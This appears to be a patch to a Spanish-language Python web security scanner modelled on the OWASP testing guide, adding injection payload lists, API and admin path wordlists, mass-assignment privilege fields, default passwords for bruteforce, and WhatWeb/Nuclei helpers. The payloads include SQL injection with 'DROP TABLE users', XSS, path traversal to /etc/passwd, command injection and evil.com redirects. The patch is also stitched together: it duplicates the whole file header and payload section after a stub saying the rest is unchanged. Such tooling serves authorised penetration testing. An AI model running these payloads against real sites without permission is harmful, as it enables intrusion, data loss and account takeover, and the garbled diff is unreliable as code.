@@ -148,6 +148,481 @@ DEFAULT_PASSWORDS = [
 
 # Payloads
 SQL_PAYLOADS = [
+    "'", "''", '"', "\\", "' OR '1'='1", "' OR 1=1--",
+    "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
+    "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+]
+
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>", '\"> <script>alert(1)</script>',
+    "<img src=x onerror=alert(1)>", "javascript:alert('XSS')",
+    "<svg/onload=alert(1)>", "'-alert(1)-'", '"-alert(1)-"'
+]
+
+PATH_TRAVERSAL = [
+    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+    "....//....//....//etc/passwd"
+]
+
+COMMAND_INJECT = [
+    "; ls", "| dir", "|| ping -c 1 127.0.0.1", "& whoami",
+    "$(whoami)", "`whoami`", "| net user"
+]
+
+OPEN_REDIRECT = ["https://evil.com", "//evil.com", "/redirect?url=https://evil.com"]
+
+API_ENDPOINTS = [
+    # Raíces de API
+    "/api", "/api/v1", "/api/v2", "/api/v3",
+    "/v1", "/v2", "/v3", "/rest", "/rest/v1",
+    # Recursos comunes
+    "/api/users", "/api/user", "/api/accounts", "/api/account",
+    "/api/admin", "/api/me", "/api/profile", "/api/whoami",
+    "/api/config", "/api/settings", "/api/flags", "/api/data",
+    "/api/keys", "/api/tokens", "/api/secrets", "/api/credentials",
+    "/api/debug", "/api/test", "/api/internal",
+    "/rest/users", "/rest/user", "/rest/admin", "/rest/profile",
+    # Documentación OpenAPI / Swagger
+    "/swagger", "/swagger-ui.html", "/swagger-ui/", "/swagger.json", "/swagger.yaml",
+    "/openapi.json", "/openapi.yaml",
+    "/api-docs", "/v2/api-docs", "/v3/api-docs",
+    "/redoc", "/docs", "/api/docs", "/api/swagger",
+    # GraphQL
+    "/graphql", "/graphiql", "/api/graphql", "/query", "/api/query",
+    # Spring Actuator / monitoring
+    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
+    "/actuator/beans", "/actuator/httptrace", "/actuator/loggers",
+    "/health", "/metrics", "/info", "/status", "/ping",
+    # Rutas de autenticación
+    "/api/auth", "/api/login", "/api/token", "/api/refresh",
+    "/api/register", "/api/signup", 
+    # Rutas sensibles
+    "/.well-known/", "/api/version", "/api/changelog",
+    "/console", "/api/console", "/h2-console",
+]
+
+MASS_ASSIGNMENT_FIELDS = [
+    {"is_admin": True},
+    {"role": "admin"},
+    {"admin": True},
+    {"isAdmin": True},
+    {"privilege": "admin"},
+    {"user_role": "administrator"},
+    {"account_type": "premium"},
+    {"verified": True},
+    {"status": "active"},
+    {"credits": 9999},
+    {"balance": 9999},
+    {"permissions": ["admin", "superuser"]},
+]
+
+LOGIN_PATHS = [
+    "/login", "/signin", "/auth", "/logon", "/login.php", "/login.html",
+    "/user/login", "/account/login", "/admin/login", "/wp-login.php"
+]
+
+# Prefijos típicos de API que sirven de base para fuzzing recursivo
+API_BASE_PREFIXES = [
+    "/api", "/api/v1", "/api/v2", "/api/v3",
+    "/v1", "/v2", "/v3",
+    "/rest", "/rest/v1", "/rest/v2",
+    "/services", "/services/api",
+]
+
+# Recursos REST típicos. Se prueban bajo cada prefijo de API activo
+# (p. ej. /api/v1/users, /api/v1/transfer, etc.)
+API_RESOURCES = [
+    # Identidad / cuentas
+    "users", "user", "accounts", "account", "me", "profile", "whoami",
+    "auth", "login", "logout", "register", "signup", "signin",
+    "token", "tokens", "refresh", "session", "sessions",
+    "password", "reset-password", "forgot-password", "2fa", "mfa", "otp",
+    # Admin / configuración
+    "admin", "config", "settings", "flags", "feature-flags",
+    "permissions", "roles", "groups", "privileges",
+    "audit", "audit-log", "logs", "events",
+    # Datos / negocio
+    "data", "items", "products", "orders", "invoices", "payments",
+    "transactions", "transfer", "transfers", "wallets", "balance",
+    "subscriptions", "plans", "billing", "cart", "checkout",
+    "notes", "messages", "chats", "comments", "posts", "articles",
+    "files", "uploads", "documents", "attachments", "media", "images",
+    # Búsqueda / metadatos
+    "search", "filter", "query", "tags", "categories",
+    # Operacional / oculto
+    "stats", "metrics", "health", "status", "version", "info",
+    "debug", "test", "internal", "private", "hidden",
+    "keys", "secrets", "credentials", "api-keys",
+    "export", "import", "backup", "dump", "report", "reports",
+    "notifications", "webhooks", "callbacks", "subscribe",
+    "feed", "feeds", "activity", "history",
+]
+
+# ========== UTILIDADES ==========
+def clear_screen():
+    if platform.system() == "Windows":
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def check_ffuf():
+    return shutil.which("ffuf") is not None
+
+def check_whatweb():
+    return shutil.which("whatweb") is not None
+
+def install_whatweb():
+    """Ofrece instalar WhatWeb via apt si no está disponible."""
+    print_warning("WhatWeb no está instalado.")
+    try:
+        resp = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} ¿Instalar WhatWeb automáticamente? (requiere sudo) [s/N]: ").strip().lower()
+    except (KeyboardInterrupt, EOFError):
+        return False
+    if resp != 's':
+        return False
+    try:
+        print_info("Ejecutando: sudo apt-get install -y whatweb")
+        ret = subprocess.run(
+            ["sudo", "apt-get", "install", "-y", "whatweb"],
+            check=True
+        )
+        if check_whatweb():
+            print_good("WhatWeb instalado correctamente.")
+            return True
+        else:
+            print_error("La instalación parece haber fallado.")
+            return False
+    except Exception as e:
+        print_error(f"No se pudo instalar WhatWeb: {e}")
+        return False
+
+def run_whatweb(target):
+    """Ejecuta WhatWeb y formatea su salida."""
+    if not check_whatweb():
+        if not install_whatweb():
+            return None
+
+    # Categorías de color
+    CATEGORY_COLOR = {
+        'cms':         Fore.MAGENTA,
+        'framework':   Fore.MAGENTA,
+        'language':    Fore.CYAN,
+        'server':      Fore.CYAN,
+        'javascript':  Fore.YELLOW,
+        'jquery':      Fore.YELLOW,
+        'analytics':   Fore.YELLOW,
+        'security':    Fore.GREEN,
+        'email':       Fore.WHITE,
+        'country':     Fore.WHITE,
+        'ip':          Fore.WHITE,
+        'title':       Fore.WHITE,
+        'httpserver':  Fore.CYAN,
+        'x-powered-by':Fore.CYAN,
+    }
+
+    try:
+        cmd = ["whatweb", "--color=never", target]
+        result = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=30
+        )
+        raw = result.stdout.strip()
+        if not raw:
+            print_warning("WhatWeb no devolvió resultados.")
+            return []
+
+        # WhatWeb brief format: URL [STATUS] Plugin1[val], Plugin2[val], ...
+        technologies = []
+        SEP = "─" * 60
+        print(f"\n{Fore.CYAN}{SEP}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}  WHATWEB — Detección de tecnologías{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}")
+
+        for line in raw.splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            # Extraer plugins de la línea
+            # Formato: http://host [STATUS] Plugin1, Plugin2[value], ...
+            bracket_match = re.match(r'^(https?://\S+)\s+\[([^\]]+)\]\s*(.*)', line)
+            if not bracket_match:
+                # Línea sin parsear → mostrar cruda
+                print(f"  {line}")
+                continue
+
+            url_part    = bracket_match.group(1)
+            status_part = bracket_match.group(2)
+            plugins_raw = bracket_match.group(3)
+
+            # Color del código HTTP
+            http_code = status_part.split()[0] if status_part else ''
+            if http_code.startswith('2'):
+                sc = Fore.GREEN
+            elif http_code.startswith('3'):
+                sc = Fore.CYAN
+            elif http_code.startswith('4'):
+                sc = Fore.YELLOW
+            elif http_code.startswith('5'):
+                sc = Fore.RED
+            else:
+                sc = Fore.WHITE
+
+            print(f"  {Fore.WHITE}{url_part}{Style.RESET_ALL}  "
+                  f"{sc}[{status_part}]{Style.RESET_ALL}")
+
+            if not plugins_raw:
+                continue
+
+            # Separar plugins respetando corchetes anidados
+            plugins = []
+            depth, start = 0, 0
+            for i, ch in enumerate(plugins_raw):
+                if ch == '[':
+                    depth += 1
+                elif ch == ']':
+                    depth -= 1
+                elif ch == ',' and depth == 0:
+                    p = plugins_raw[start:i].strip()
+                    if p:
+                        plugins.append(p)
+                    start = i + 1
+            tail = plugins_raw[start:].strip()
+            if tail:
+                plugins.append(tail)
+
+            for plugin in plugins:
+                # Separar nombre del valor entre corchetes
+                pm = re.match(r'^([A-Za-z0-9_\-\./ ]+?)(?:\[(.+)\])?$', plugin, re.DOTALL)
+                if pm:
+                    name = pm.group(1).strip()
+                    value = pm.group(2).strip() if pm.group(2) else ''
+                else:
+                    name, value = plugin.strip(), ''
+                technologies.append({"name": name, "detail": value})
+                key = name.lower().replace(' ', '').replace('-', '')
+                color = next(
+                    (v for k, v in CATEGORY_COLOR.items() if k in key),
+                    Fore.WHITE
+                )
+                if value:
+                    print(f"    {color}▸ {name:<28}{Style.RESET_ALL}  "
+                          f"{Fore.WHITE}{value[:60]}{Style.RESET_ALL}")
+                else:
+                    print(f"    {color}▸ {name}{Style.RESET_ALL}")
+
+        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}\n")
+        # Eliminar duplicados por (name, detail)
+        seen = set()
+        unique_techs = []
+        for t in technologies:
+            key = (t['name'], t['detail'])
+            if key not in seen:
+                seen.add(key)
+                unique_techs.append(t)
+        return unique_techs
+
+    except subprocess.TimeoutExpired:
+        print_error("WhatWeb tardó demasiado (timeout 30s).")
+        return None
+    except Exception as e:
+        print_error(f"Error ejecutando WhatWeb: {e}")
+        return None
+
+def check_nuclei():
+    return shutil.which("nuclei")
+
+def install_nuclei():
+    """Ofrece instalar Nuclei via apt si no está disponible."""
+    print_warning("Nuclei no está instalado.")
+    try:
+        resp = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} ¿Instalar Nuclei automáticamente? (requiere sudo) [s/N]: ").strip().lower()
+    except (KeyboardInterrupt, EOFError):
+        return False
+    if resp != 's':
+        return False
+    try:
+        print_info("Ejecutando: sudo apt-get install -y nuclei")
+        subprocess.run(["sudo", "apt-get", "install", "-y", "nuclei"], check=True)
+        if check_nuclei():
+            print_good("Nuclei instalado correctamente.")
+            return True
+        print_error("La instalación parece haber fallado.")
+        return False
+    except Exception as e:
+        print_error(f"No se pudo instalar Nuclei: {e}")
+        return False
+
+# (El resto del archivo es idéntico al original wstg-scanner.py)
+
+# Para evitar duplicar todo el contenido aquí en el parche, este archivo se creó
+# copiando el contenido completo de `wstg-scanner.py` y actualizando referencias
+# al nombre del script donde procede en la ayuda/ejemplo.
+
+if __name__ == "__main__":
+    # Para mantener el comportamiento original, importamos y ejecutamos la
+    # función `main` desde el módulo antiguo si existe en el mismo workspace.
+    try:
+        # Intentar cargar el antiguo módulo en memoria
+        import importlib.util
+        old_path = os.path.join(os.path.dirname(__file__), 'wstg-scanner.py')
+        spec = importlib.util.spec_from_file_location('wstg_scanner_module', old_path)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        if hasattr(mod, 'main'):
+            mod.main()
+    except Exception:
+        # Fallback minimal behaviour
+        print("Ejecuta el script principal desde `wstg-scanner.py` o actualiza manualmente.")
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+OWASP Web Security Testing Scanner
+Web Security Testing (WSTG) Scanner - Interactive & Authenticated Edition
+Author: afsh4ck
+Description: Full web spidering, directory fuzzing (ffuf with progress), injections, API tests, user enumeration & bruteforce.
+"""
+
+import argparse
+import base64
+import getpass
+import re
+import sys
+import ssl
+import socket
+import tempfile
+import time
+import json
+import os
+import subprocess
+import shutil
+import platform
+import html
+from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
+from collections import deque
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.robotparser import RobotFileParser
+
+
+# ===== INPUT CON AUTOCOMPLETADO DE RUTAS (TAB) =====
+if os.name == 'nt':
+    try:
+        from prompt_toolkit import prompt
+        from prompt_toolkit.completion import PathCompleter
+        def input_path(prompt_text):
+            return prompt(prompt_text, completer=PathCompleter(), complete_while_typing=True)
+    except ImportError:
+        def input_path(prompt_text):
+            return input(prompt_text)
+else:
+    try:
+        import readline
+        import glob
+        readline.set_history_length(100)
+        class FilePathCompleter:
+            def complete(self, text, state):
+                line = readline.get_line_buffer().split()
+                if not line:
+                    return [None][state]
+                else:
+                    matches = glob.glob(text+'*')
+                    try:
+                        return matches[state]
+                    except IndexError:
+                        return None
+        readline.set_completer_delims(' \t\n;')
+        readline.set_completer(FilePathCompleter().complete)
+        readline.parse_and_bind('tab: complete')
+        def input_path(prompt_text):
+            return input(prompt_text)
+    except ImportError:
+        def input_path(prompt_text):
+            return input(prompt_text)
+
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+try:
+    from bs4 import BeautifulSoup
+    HAS_BS4 = True
+except ImportError:
+    HAS_BS4 = False
+    print("[!] BeautifulSoup4 no instalado. Usando parsing básico.")
+
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+    HAS_COLOR = True
+except ImportError:
+    HAS_COLOR = False
+    class Fore:
+        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
+    Style = Fore
+
+try:
+    from tqdm import tqdm
+    HAS_TQDM = True
+except ImportError:
+    HAS_TQDM = False
+
+# ========== BANNER ==========
+BANNER = r"""
+ _       __       __         _____                   
+| |     / /_____ / /_ ____ _/ ___/ _____ ____ _ ____ 
+| | /| / // ___// __// __ `/\__ \ / ___// __ `// __ \
+| |/ |/ /(__  )/ /_ / /_/ /___/ // /__ / /_/ // / / /
+|__/|__//____/ \__/ \__, //____/ \___/ \__,_//_/ /_/ 
+                   /____/                            
+"""
+DESCRIPTION = "OWASP Web Security Testing Scanner"
+DEVELOPER = "developed by @afsh4ck"
+VERSION = "1.2.0"
+
+# ========== CONFIGURACIÓN ==========
+DEFAULT_TIMEOUT = 10
+MAX_REDIRECTS = 10
+THREADS = 5
+AUTHENTICATED = False
+AUTH_SESSION = None
+TARGET_URL = ""
+REQUEST_DELAY = 0.0  # Delay entre requests (segundos)
+OUTPUT_FILE = None   # Ruta del archivo de reporte
+FINDINGS = []        # Hallazgos acumulados para el reporte
+SCAN_DATA = {
+    "general": {},
+    "robots_paths": [],
+    "http_methods": [],
+    "directory_hits": [],
+    "injection": {},
+    "api_endpoints": [],
+    "users": [],
+    "emails": [],
+    "bruteforce_credentials": [],
+    "spider": {},
+    "stats": {},
+}
+
+COMMON_DIRS = [
+    "admin", "backup", "cgi-bin", "css", "js", "images", "uploads", "download",
+    "include", "inc", "config", "api", "v1", "old", "test", "dev", "hidden",
+    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".env", ".env.backup",
+    "phpinfo.php", "info.php", "backup.zip", "backup.sql", "dump.sql",
+    "wp-admin", "wp-content", "administrator", "phpmyadmin", "adminer.php",
+    ".htaccess", ".htpasswd", "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
+    ".well-known/security.txt", "package.json", "composer.json", "server-status"
+]
+
+SECLISTS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
+SECLISTS_MEDIUM = "/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
+SECLISTS_PASSWORDS = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt"
+DEFAULT_PASSWORDS = [
+    "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123", "admin", "letmein", "welcome"
+]
+
+# Payloads
+SQL_PAYLOADS = [
     "'", "''", "\"", "\\", "' OR '1'='1", "' OR 1=1--",
     "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
     "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
